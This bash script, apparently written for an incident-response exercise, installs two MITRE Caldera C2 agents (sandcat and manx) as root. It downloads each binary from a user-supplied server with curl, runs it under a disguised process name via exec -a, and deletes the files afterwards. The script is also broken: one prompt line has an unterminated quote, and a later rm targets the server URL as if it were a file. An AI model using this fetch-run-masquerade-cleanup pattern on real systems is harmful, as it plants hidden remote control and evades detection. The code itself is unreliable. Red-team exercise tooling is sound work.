#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "❌ This script must be run as root or with sudo. Please try again."
  exit 1
fi

read -p "Enter the first Caldera URL: " server1
read -p "Enter the first agent process name: " agent1
read -p "Enter the second Caldera URL: " server2
read -p "Enter the second Caldera
read -p "Enter the second agent process name: " agent2


echo "installing first agent"

#Get the main, louder sandcat agent
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server1/file/download > $agent1
chmod +x $agent1
( exec -a $agent1  $agent1 -server $server1 -group ir-exercise ) &


echo "installing second agent"
#Get the quieter manx agent
socket="$server2"
contact="tcp"
curl -s -X POST -H "file:manx.go" -H "platform:linux" $server2/file/download > $agent2
chmod +x $agent2
( exec -a $agent2 $agent2 -http $server2 -socket $socket -contact $contact -v ) &

echo "agents installed, cleaning up"
sleep 5
rm -f $agent1 $agent2 $socket
echo "cleaning finished"